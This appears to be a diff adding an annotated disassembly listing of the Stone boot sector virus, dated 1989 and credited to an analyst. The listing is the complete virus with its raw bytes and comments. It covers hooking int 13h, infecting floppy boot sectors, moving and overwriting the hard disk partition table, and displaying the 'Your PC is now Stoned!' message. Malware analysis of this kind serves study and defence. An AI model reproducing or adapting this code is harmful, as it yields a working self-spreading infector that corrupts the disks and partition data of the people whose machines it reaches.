@@ -1,0 +1,255 @@
+;
+;       STONE virus
+;       Boot Sector Disassembly Listing
+;       Analyzed by Kelvin Lee
+;	Last updated 28-04-1989
+;
+
+07c0:0000 ea0500c007     jmp    07c0:0005
+07c0:0005 e99900         jmp	00a1 
+
+07c0:0008 00             db     00                      ; status byte
+07c0:0009 809e           dw     9e80                    ; org int 13h offset
+07c0:000b 00f0           dw     f000                    ; org int 13h segment
+07c0:000d e400           dw     00e4                    ; high mem start offset
+07c0:000f 809f           dw     9f80                    ; high mem segment
+07c0:0011 007c           dw     7c00                    ; org boot sector offset
+07c0:0014 0000           dw     0000                    ; org boot sector segment
+
+;
+;       new int 13h (abs disk r/w) handler
+;
+07c0:0015 1e             push	ds
+07c0:0016 50             push	ax
+07c0:0017 80fc02         cmp    ah,02                   ; chk for r/w func
+07c0:001a 7217           jb     0033
+
+07c0:001c 80fc04         cmp    ah,04                   ; chk for vrfy dsk sctr
+07c0:001f 7312           jnb	0033 
+
+;
+;       do the following if ah == 02,03 (read,write)
+;
+07c0:0021 0ad2           or     dl,dl                   ; chk drv no == 0 (A)
+07c0:0023 750e           jnz    0033
+ 
+;
+;       do the following if read/write disk sector on drive a:
+;
+07c0:0025 33c0           xor	ax,ax 
+07c0:0027 8ed8           mov	ds,ax 
+07c0:0029 a03f04         mov    al,[043f]               ; diskette motor status
+07c0:002c a801           test   al,01                   ; chk for a: motor on
+07c0:002e 7503           jnz	0033 
+
+;
+;       do the following if drive a: motor is off
+;
+07c0:0030 e80700         call   003a
+ 
+07c0:0033 58             pop    ax                      
+07c0:0034 1f             pop	ds 
+07c0:0035 2eff2e0900     jmp    far cs:[0009]           ; call org int 13h
+
+;
+;       additional job the virus do
+;
+07c0:003a 53             push	bx 
+07c0:003b 51             push	cx 
+07c0:003c 52             push	dx 
+07c0:003d 06             push	es 
+07c0:003e 56             push	si 
+07c0:003f 57             push	di 
+07c0:0040 be0400         mov    si,0004                 ; try read disk 4 times
+
+07c0:0043 b80102         mov	ax,0201 
+07c0:0046 0e             push	cs 
+07c0:0047 07             pop	es 
+07c0:0048 bb0002         mov	bx,0200 
+07c0:004b 33c9           xor	cx,cx 
+07c0:004d 8bd1           mov	dx,cx 
+07c0:004f 41             inc	cx 
+07c0:0050 9c             pushf                          ; read a: boot sector
+07c0:0051 2eff1e0900     call   far cs:[0009]           ; call org int 13h
+07c0:0056 730e           jnb    0066                    ; jump if no error
+
+;
+;       do the following if read disk error
+;
+07c0:0058 33c0           xor	ax,ax 
+07c0:005a 9c             pushf	 
+07c0:005b 2eff1e0900     call   far cs:[0009]           ; reset diskette system
+07c0:0060 4e             dec	si 
+07c0:0061 75e0           jnz    0043                    ; retry
+07c0:0063 eb35           jmp    009a                    ; absolute error exists
+07c0:0065 90             nop	 
+
+07c0:0066 33f6           xor    si,si 
+07c0:0068 bf0002         mov	di,0200 
+07c0:006b fc             cld	 
+07c0:006c 0e             push	cs 
+07c0:006d 1f             pop	ds 
+07c0:006e ad             lodsw	 
+07c0:006f 3b05           cmp	ax,[di] 
+07c0:0071 7506           jnz	0079 
+07c0:0073 ad             lodsw	 
+07c0:0074 3b4502         cmp	ax,[di+02] 
+07c0:0077 7421           jz     009a                    ; jmp if btsctr=vrssctr
+
+;
+;       do the following if a: boot sector != this virus sector
+;
+07c0:0079 b80103         mov    ax,0301 
+07c0:007c bb0002         mov	bx,0200 
+07c0:007f b103           mov	cl,03 
+07c0:0081 b601           mov	dh,01 
+07c0:0083 9c             pushf                          ; write org boot sector
+07c0:0084 2eff1e0900     call   far cs:[0009]           ; to abs sctr h1,c0,s3
+07c0:0089 720f           jb     009a                    ; jump if write error
+
+07c0:008b b80103         mov	ax,0301 
+07c0:008e 33db           xor	bx,bx 
+07c0:0090 b101           mov	cl,01 
+07c0:0092 33d2           xor	dx,dx 
+07c0:0094 9c             pushf                          ; write virus sector
+07c0:0095 2eff1e0900     call   far cs:[0009]           ; to boot sector
+
+07c0:009a 5f             pop	di 
+07c0:009b 5e             pop	si 
+07c0:009c 07             pop	es 
+07c0:009d 5a             pop	dx 
+07c0:009e 59             pop	cx 
+07c0:009f 5b             pop	bx 
+07c0:00a0 c3             ret	 
+
+;
+;       start here
+;
+07c0:00a1 33c0           xor	ax,ax 
+07c0:00a3 8ed8           mov	ds,ax 
+07c0:00a5 fa             cli	 
+07c0:00a6 8ed0           mov	ss,ax 
+07c0:00a8 bc007c         mov	sp,7c00 
+07c0:00ab fb             sti	 
+07c0:00ac a14c00         mov    ax,[004c]               ; org int 13h offset
+07c0:00af a3097c         mov	[7c09],ax 
+07c0:00b2 a14e00         mov    ax,[004e]               ; org int 13h segment
+07c0:00b5 a30b7c         mov	[7c0b],ax 
+07c0:00b8 a11304         mov    ax,[0413]               ; memory size
+07c0:00bb 48             dec	ax 
+07c0:00bc 48             dec	ax 
+07c0:00bd a31304         mov    [0413],ax               ; memory size - 2
+07c0:00c0 b106           mov	cl,06 
+07c0:00c2 d3e0           shl	ax,cl 
+07c0:00c4 8ec0           mov	es,ax 
+07c0:00c6 a30f7c         mov    [7c0f],ax               ; high memory segment
+07c0:00c9 b81500         mov	ax,0015 
+07c0:00cc a34c00         mov    [004c],ax               ; new int 13h offset
+07c0:00cf 8c064e00       mov    [004e],es               ; new int 13h segment
+07c0:00d3 b9b801         mov	cx,01b8 
+07c0:00d6 0e             push	cs 
+07c0:00d7 1f             pop	ds 
+07c0:00d8 33f6           xor	si,si 
+07c0:00da 8bfe           mov	di,si 
+07c0:00dc fc             cld	 
+07c0:00dd f3             repz                           ; move codes to
+07c0:00de a4             movsb                          ; high memory
+07c0:00df 2eff2e0d00     jmp    far cs:[000d]           ; jump to below
+ 
+;
+;       start here after codes moved to high memory
+;
+07c0:00e4 b80000         mov	ax,0000 
+07c0:00e7 cd13           int    13                      ; reset diskette system
+07c0:00e9 33c0           xor	ax,ax 
+07c0:00eb 8ec0           mov	es,ax 
+07c0:00ed b80102         mov    ax,0201                 ; read one sector
+07c0:00f0 bb007c         mov    bx,7c00                 ; to es:bx = 0000:7c00
+07c0:00f3 2e803e080000   cmp    byte ptr cs:[0008],00
+07c0:00f9 740b           jz	0106 
+
+07c0:00fb b90700         mov    cx,0007                 ; hd abs sectr h0,c0,s7
+07c0:00fe ba8000         mov    dx,0080                 ; (sector always not
+07c0:0101 cd13           int    13                      ;  used)
+07c0:0103 eb49           jmp	014e 
+07c0:0105 90             nop	 
+
+07c0:0106 b90300         mov    cx,0003                 ; fd abs sectr h1,c0,s3
+07c0:0109 ba0001         mov    dx,0100                 ; (sector may has
+07c0:010c cd13           int    13                      ;  useful data)
+07c0:010e 723e           jb	014e 
+
+07c0:0110 26f6066c0407   test   byte ptr es:[046c],07   ; check lsb of rt clk
+07c0:0116 7512           jnz    012a
+ 
+07c0:0118 be8901         mov	si,0189 
+07c0:011b 0e             push	cs 
+07c0:011c 1f             pop	ds 
+
+07c0:011d ac             lodsb   
+07c0:011e 0ac0           or	al,al 
+07c0:0120 7408           jz	012a 
+
+07c0:0122 b40e           mov	ah,0e 
+07c0:0124 b700           mov	bh,00 
+07c0:0126 cd10           int    10                      ; display message #1
+07c0:0128 ebf3           jmp	011d 
+
+07c0:012a 0e             push   cs 
+07c0:012b 07             pop	es 
+07c0:012c b80102         mov	ax,0201 
+07c0:012f bb0002         mov	bx,0200 
+07c0:0132 b101           mov	cl,01 
+07c0:0134 ba8000         mov    dx,0080                 ; read partition table
+07c0:0137 cd13           int    13                      ; of harddisk
+07c0:0139 7213           jb     014e                    ; jump if read error
+
+07c0:013b 0e             push	cs 
+07c0:013c 1f             pop	ds 
+07c0:013d be0002         mov	si,0200 
+07c0:0140 bf0000         mov	di,0000 
+07c0:0143 ad             lodsw	 
+07c0:0144 3b05           cmp	ax,[di] 
+07c0:0146 7511           jnz	0159 
+07c0:0148 ad             lodsw	 
+07c0:0149 3b4502         cmp    ax,[di+02]              ; jmp if partition table
+07c0:014c 750b           jnz    0159                    ; != this virus sector
+
+;
+;       do the following if no harddisk
+;
+07c0:014e 2ec606080000   mov    byte ptr cs:[0008],00
+07c0:0154 2eff2e1100     jmp    far cs:[0011]           ; run org boot sector
+
+;
+;       do the following if harddisk present
+;
+07c0:0159 2ec606080002   mov	byte ptr cs:[0008],02 
+07c0:015f b80103         mov	ax,0301 
+07c0:0162 bb0002         mov	bx,0200 
+07c0:0165 b90700         mov	cx,0007 
+07c0:0168 ba8000         mov    dx,0080                 ; write org partition
+07c0:016b cd13           int    13                      ; table to h0,c0,s7
+07c0:016d 72df           jb     014e                    ; jump if write error
+ 
+07c0:016f 0e             push	cs 
+07c0:0170 1f             pop	ds 
+07c0:0171 0e             push	cs 
+07c0:0172 07             pop	es 
+07c0:0173 bebe03         mov	si,03be 
+07c0:0176 bfbe01         mov	di,01be 
+07c0:0179 b94202         mov	cx,0242 
+07c0:017c f3             repz                           ; copy the partition
+07c0:017d a4             movsb                          ; table content
+07c0:017e b80103         mov	ax,0301 
+07c0:0181 33db           xor	bx,bx 
+07c0:0183 fec1           inc    cl                      ; write the virused
+07c0:0185 cd13           int    13                      ; parition table
+07c0:0187 ebc5           jmp	014e 
+
+07c0:0189 07596f7572205043206973206e6f772053746f6e656421070d0a0a00
+          ^GY o u r   P C   i s   n o w   S t o n e d ! ^G^M^J^J
+07c0:01a5 4c4547414c495345204d4152494a55414e412100
+          L E G A L I S E   M A R I J U A N A !
+
+07c0:01b9-07c0:01ff      db     00
